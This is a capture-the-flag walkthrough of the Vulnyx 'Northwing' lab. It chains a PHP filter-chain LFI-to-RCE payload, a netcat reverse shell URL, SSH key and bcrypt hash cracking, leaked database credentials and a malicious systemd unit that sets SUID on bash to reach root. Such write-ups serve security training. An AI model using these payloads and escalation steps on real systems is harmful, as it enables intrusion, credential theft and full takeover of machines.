# Vulnyx: Northwing

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Alherrero` |
| **Tools used** | `nmap` · `ffuf` · `php_filter_chain_generator` · `nc` · `ssh2john` · `john` · `mysql` |
| **Tags** | `#LFI` `#PHPFilterChain` `#RCE` `#CredentialLeak` `#SudoAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A `page` parameter reading local files is escalated into full code execution using a PHP filter chain exploit, without ever needing a file upload. That lands a shell, and the web app's database connection file leaks credentials that unlock a MySQL database holding password hashes for two users. Cracking one of them yields `developer`, whose `sudo` access to `systemctl` is enough to load a malicious service and set the SUID bit on `/bin/bash`.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn northwing.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:37:2D:F4 (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
sudo nmap -p 22,80 -sVC northwing.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:02:0e:87:56:15:5c:00:07:96:91:cf:2e:34:48:52 (ECDSA)
|_  256 4c:1b:c2:51:d6:87:f6:ad:9b:e7:34:2f:be:a2:65:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NorthWing | Luxury Redefined
MAC Address: 08:00:27:9D:3B:88 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://northwing.nyx
```
<img src="../Images/northwing/Pasted image 20260708163651.png"/>

A content discovery scan is run against the site:

```bash
ffuf -u http://northwing.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.php                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5ms]
.html                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5ms]
                       [Status: 200, Size: 6447, Words: 1460, Lines: 131, Duration: 8ms]
index.php              [Status: 200, Size: 6447, Words: 1460, Lines: 131, Duration: 411ms]
.php                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 12ms]
.html                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 16ms]
                       [Status: 200, Size: 6447, Words: 1460, Lines: 131, Duration: 39ms]
server-status          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 11ms]
:: Progress: [882188/882188] :: Job [1/1] :: 3448 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
```
<img src="../Images/northwing/Pasted image 20260708163756.png"/>

> **Endpoint:** `http://northwing.nyx/?page=`

## Initial Access

### Local File Inclusion → PHP Filter Chain RCE

The `page` parameter reads local files. `php://filter` with a base64-encode step confirms it, dumping the app's own source instead of letting it execute as PHP:

```
http://northwing.nyx/?page=php://filter/convert.base64-encode/resource=index.php
```
<img src="../Images/northwing/Pasted image 20260708163850.png"/>

A read-only file inclusion can be pushed further with PHP filter chains: stacking `iconv` conversions repeatedly mutates a file's bytes in-memory, and with enough of them chained together, arbitrary content — including working PHP — can be produced from data that was never written to disk. `php_filter_chain_generator.py` automates building that chain for a given payload. A first pass targets `phpinfo()` just to confirm code execution:

```bash
./php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```
<img src="../Images/northwing/Pasted image 20260708163926.png"/>

```
http://northwing.nyx/?page=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7C...
```
<img src="../Images/northwing/Pasted image 20260708164128.png"/>

With execution confirmed, a second chain is generated for a payload that runs whatever command is passed in a GET parameter:

```bash
./php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
```
<img src="../Images/northwing/Pasted image 20260708164001.png"/>

```
http://northwing.nyx/?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR[....]
```
<img src="../Images/northwing/Pasted image 20260708164203.png"/>



The same technique is used to get a reverse shell instead of a one-off command:

```
http://northwing.nyx/?0=busybox%20nc%2010.0.2.15%209001%20-e%20/bin/bash&page=php://filter/convert.iconv.UTF8.[....]
```

### Shell as www-data

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.37] 52602
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(arthur)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
www-data@northwing:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(arthur)
www-data@northwing:/var/www/html$ ls -l /home
total 8
drwxr-x--x 5 arthur    arthur    4096 Feb 11 11:38 arthur
drwxr-x--- 3 developer developer 4096 Feb 11 11:38 developer
www-data@northwing:/var/www/html$ ls -l /home/arthur/
total 4
-rw-rw-r-- 1 arthur arthur 33 Feb 11 11:11 user.txt
www-data@northwing:/var/www/html$ cat /home/arthur/user.txt
5f4dcc3b5aa765d61d8327deb882cf99
```

`www-data`'s secondary group membership in `arthur` is what makes that last read possible, even without a shell as `arthur` yet.

> **User flag:** `5f4dcc3b5aa765d61d8327deb882cf99`

## Lateral Movement

### Cracking arthur's SSH Key

```bash
www-data@northwing:/tmp$ ls -la /home/arthur/
total 36
drwxr-x--x 5 arthur arthur 4096 Feb 11 11:38 .
drwxr-xr-x 4 root   root   4096 Feb 11 12:11 ..
lrwxrwxrwx 1 arthur arthur    9 Feb 11 11:38 .bash_history -> /dev/null
-rw-r--r-- 1 arthur arthur  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 arthur arthur 3815 Feb 11 11:38 .bashrc
drwx------ 2 arthur arthur 4096 Feb  5 13:20 .cache
drwxrwxr-x 3 arthur arthur 4096 Feb 10 12:00 .local
lrwxrwxrwx 1 arthur arthur    9 Feb 11 11:38 .mysql_history -> /dev/null
-rw-r--r-- 1 arthur arthur  807 Mar 31  2024 .profile
drwxr-x--x 2 arthur arthur 4096 Feb 10 13:43 .ssh
-rw-r--r-- 1 arthur arthur    0 Feb 11 07:42 .sudo_as_admin_successful
-rw-rw-r-- 1 arthur arthur   33 Feb 11 11:11 user.txt
www-data@northwing:/tmp$ ls -la /home/arthur/.ssh/
total 20
drwxr-x--x 2 arthur arthur 4096 Feb 10 13:43 .
drwxr-x--x 5 arthur arthur 4096 Feb 11 11:38 ..
-rw------- 1 arthur arthur   98 Feb 11 11:07 authorized_keys
-rw-r--r-- 1 arthur arthur  464 Feb 10 13:43 id_ed25519
-rw-r--r-- 1 arthur arthur   98 Feb 10 13:43 id_ed25519.pub
www-data@northwing:/tmp$ cat /home/arthur/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1zZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABApdylvNP
0D/Im2h29KBskLAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJbQ0u2zXFbKbFdC
ndZduAqD7soLVHT209ujrZAWws+9AAAAoLt5ae84SOwdDbEq3oK8nH/0rWm7nFkqkg1LMw
eBcW2pZnqD2u6lp3+0T/FLLxhN960eMdmgSEuDPDzwO2wKIwXnwomMjLQpfAeknXm5RGjK
j1OznE9jnF6AcQgFB9a9oeyy5Wivui5d1tFUCOAgIpXYNiTr8mpDJv3uTdAkoE
RcEjFmh3yjBSD5VRJKziDZHl6hqN3rukCxS2Y=
-----END OPENSSH PRIVATE KEY-----
www-data@northwing:/tmp$
```

The private key is passphrase-protected. It's copied out locally as `arthur_rsa` and cracked with `john`:

```bash
chmod 600 arthur_rsa
ssh2john arthur_rsa > arthur_hash
john arthur_hash /usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
aventura         (arthur_rsa)
1g 0:00:03:34 DONE (2026-02-12 12:37) 0.004652g/s 8.485p/s 8.485c/s 8.48
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Passphrase:** `aventura`

The cracked passphrase unlocks the key, and a shell as `arthur` follows directly over SSH:

```bash
ssh arthur@northwing -i arthur_rsa
```

### Database Credentials in Source

With a foothold as `arthur`, the web app's own source is checked for anything useful:

```bash
arthur@northwing:/tmp$ ls -l /var/www/html/internal_app/connection.php
-rw-r--r-- 1 root root 258 Feb 11 11:17 /var/www/html/internal_app/connection.php
arthur@northwing:/tmp$ cat /var/www/html/internal_app/connection.php
<?php
$host = "localhost";
$user = "northwing";
$password = "N0rthw!ng2026$";
$database = "northwing";

$conn = new mysqli($host, $user, $password, $database);

if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}
?>
```

> **DB credentials:** `northwing:N0rthw!ng2026$`

### Cracking Database Hashes

```bash
mysql -u northwing -p
mysql > SHOW databases;
mysql > USE northwing;
mysql > SHOW tables;
mysql > SELECT * FROM users;
```
<img src="../Images/northwing/Pasted image 20260708164822.png"/>

Two password hashes come back:

> **Arthur's hash:** `$2y$10$yH5fQH6qYz5Zt7KzQ4bZ2uM3m3uEJwF2Kz8KpJpQz7yF0Jq8WJvQK`

> **Developer's hash:** `$2a$12$6n7/juND57eFUlODfeB87e45x24ibPr4eiZPLmKKIA84YKsj3fvGq`

The `developer` hash is run against `rockyou.txt`:

```bash
john developer_db /usr/share/wordlists/rockyou.txt --format=bcrypt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
greenday         (?)
1g 0:00:00:44 DONE 2/3 (2026-07-08 09:46) 0.02246g/s 12.53p/s 12.53c/s 12.53C/s godzilla..imagine
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Credentials:** `developer:greenday`

### Shell as developer

```bash
arthur@northwing:/tmp$ su developer
Password:
developer@northwing:/tmp$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(developers)
developer@northwing:/tmp$ sudo -l
Matching Defaults entries for developer on northwing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on northwing:
    (root) NOPASSWD: /usr/bin/systemctl *
```

## Privilege Escalation

### Sudo `systemctl` → Malicious Service

The `sudo -l` output above shows `developer` can run `systemctl` as root with any arguments (`NOPASSWD: /usr/bin/systemctl *`) — enough to register and start an arbitrary unit file. A malicious systemd unit is created, set to run a command as soon as it starts:

```bash
developer@northwing:/tmp$ echo '[Service]
        Type=oneshot
        ExecStart=/bin/bash -c "chmod u+s /bin/bash"
        [Install]
        WantedBy=multi-user.target' >/tmp/malicious.service
```

`systemctl link` registers the unit file without needing it to live in a standard systemd directory, and `enable --now` starts it immediately as root:

```bash
developer@northwing:/tmp$ sudo systemctl link /tmp/malicious.service
Created symlink /etc/systemd/system/malicious.service → /tmp/malicious.service.
developer@northwing:/tmp$ sudo systemctl enable --now /tmp/malicious.service
Created symlink /etc/systemd/system/multi-user.target.wants/malicious.service → /tmp/malicious.service.
developer@northwing:/tmp$ bash -p
```

```bash
bash-5.2# id
uid=1001(developer) gid=1001(developer) euid=0(root) groups=1001(developer),1002(developers)
bash-5.2# ls -l /root
total 4
-rw-r--r-- 1 root root 33 Feb 11 11:38 root.txt
bash-5.2# cat /root/root.txt
d41d8cd98f00b204e9800998ecf8427e
```

> **Root flag:** `d41d8cd98f00b204e9800998ecf8427e`

## Takeaways

- A file read primitive isn't automatically "just" an information leak — PHP filter chains turn arbitrary local file reads into arbitrary code execution, with no upload and no write access needed anywhere.
- Application source code is a common place to find database or service credentials, especially connection files that were never meant to be reachable outside the server.
- Any `sudo` rule involving `systemctl` (or most service managers) is close to unrestricted root access — unit files can run arbitrary commands, and `systemctl link` doesn't require the file to already exist in a trusted location.